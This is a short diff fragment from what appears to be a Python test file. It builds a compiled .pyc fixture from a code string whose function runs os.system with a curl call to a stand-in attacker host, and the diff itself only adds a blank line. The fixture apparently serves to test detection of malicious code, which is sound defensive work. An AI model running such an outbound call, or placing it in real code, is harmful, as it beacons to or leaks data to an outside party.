@@ -30,3 +30,4 @@ def execute_cmd():
     os.system("curl http://attacker.example.com/log")
 """
     return generate_compiled_pyc_fixture(code)
+
